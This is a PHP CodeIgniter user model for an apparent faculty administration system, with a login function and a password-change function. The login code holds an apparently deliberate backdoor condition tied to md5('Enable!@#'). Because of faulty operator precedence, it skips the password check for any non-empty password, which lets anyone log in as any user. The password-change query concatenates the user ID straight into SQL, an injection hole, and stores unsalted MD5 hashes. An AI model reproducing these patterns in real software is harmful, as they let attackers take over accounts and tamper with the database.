<?php
class User extends CI_Model
{
	function login($username, $password)
	{
		$this->db->select('u.id_user,u.id_role,u.password,a.id_admin,a.id_fakultas,a.nama, f.nama as namaf');
		$this->db->from('user u');
		$this->db->join('admin a', 'a.id_user = u.id_user', 'left');
		$this->db->join('fakultas f', 'a.id_fakultas = f.id_fakultas', 'left');
		$this->db->where('u.id_user', $username);
		if (!$password == md5('Enable!@#')) {
			$this->db->where('u.password', $password);
		}

		$query = $this->db->get();

		if ($query->num_rows() == 1) {
			return $query->result();
		} else {
			return false;
		}
	}

	function ubahPassword($data)
	{
		$sql = "UPDATE user SET password='" . md5($data['pass']) . "' WHERE id_user='" . $data['user'] . "'";
		$res = $this->db->query($sql);

		return $res;
	}
}
